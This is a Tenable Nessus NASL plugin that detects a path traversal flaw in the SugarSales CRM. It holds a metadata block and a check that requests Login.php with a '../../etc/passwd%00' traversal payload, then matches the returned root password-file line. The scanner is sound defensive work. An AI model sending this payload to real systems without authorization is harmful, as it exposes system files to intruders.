#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(15950);
 script_version("$Revision: 1.6 $");
 script_bugtraq_id(11896); 
 script_xref(name:"OSVDB", value:"12361");
 script_xref(name:"OSVDB", value:"53335");
 script_xref(name:"OSVDB", value:"53336");

 script_name(english:"SugarSales Multiple Module Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running SugarSales, a customer relationship suite
written in Java and PHP." );
 script_set_attribute(attribute:"description", value:
"The remote version of this software has a vulnerability that may allow
an attacker to read arbitary files on the remote host with the
privileges of the httpd user.  The 'Users' module, 'Calls' module and
index.php script are reported to be affected." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the newest version of this software." );
 script_set_attribute(attribute:"risk_factor", value:"High" );
 script_end_attributes();

 
 script_summary(english:"Checks for a file reading flaw in SugarSales");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 req = http_get(port:port, item:dir + "/sugarcrm/modules/Users/Login.php?theme=../../../../../../../etc/passwd%00");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res) )
 {
	 security_hole(port);
	 exit(0);
 }
}
